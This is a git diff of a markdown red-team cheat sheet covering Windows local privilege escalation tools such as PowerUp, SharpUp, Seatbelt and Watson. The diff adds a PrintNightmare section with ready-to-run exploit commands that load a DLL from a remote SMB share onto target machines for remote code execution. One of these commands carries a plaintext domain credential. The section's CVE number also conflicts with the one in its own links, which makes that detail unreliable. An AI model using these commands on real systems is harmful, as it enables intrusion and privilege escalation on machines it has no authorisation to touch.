@@ -38,20 +38,20 @@ powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
 ```
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
-### (PowerUp)[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1] - PowerSploit module
+### [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) - PowerSploit module
 ```
 powershell-import --> PowerUp.ps1
 powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
 ```
 
-### (SharpUp)[https://github.com/GhostPack/SharpUp] - .NET port of PowerUp
+### [SharpUp](https://github.com/GhostPack/SharpUp) - .NET port of PowerUp
 ```
 # Run all checks automatically
 execute-assembly C:\SharpUp.exe
 ```
 
 ### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
-GREAT tool to query a local system system/user/remote/misc data  
+GREAT tool to query a local system to gather system/user/remote/misc data
 Can be used as Admin or normal-privileged user  
 ```
 # Run ALL checks - returns TONS of data
@@ -80,6 +80,22 @@ execute-assembly C:\SeatBelt.exe -group=misc -outputfile="C:\Temp\SeatBelt-misc.
     Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004
     Server 2016 & 2019
 execute-assembly C:\Watson.exe 
+```
+
+### PrintNightmare priv esc exploit (CVE-2021-3452)
+```
+# Impacket's PrintNightmare: https://github.com/cube0x0/CVE-2021-1675
+# Impacket's SharpNightmare (Csharp): https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare
+# PowerShell PrintNightmare local priv esc: https://github.com/calebstewart/CVE-2021-1675
+
+# Local priv esc
+C:\SharpPrintNightmare.exe C:\addCube.dll
+
+# RCE using existing context
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
+
+# RCE using runas /netonly
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
 ```
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
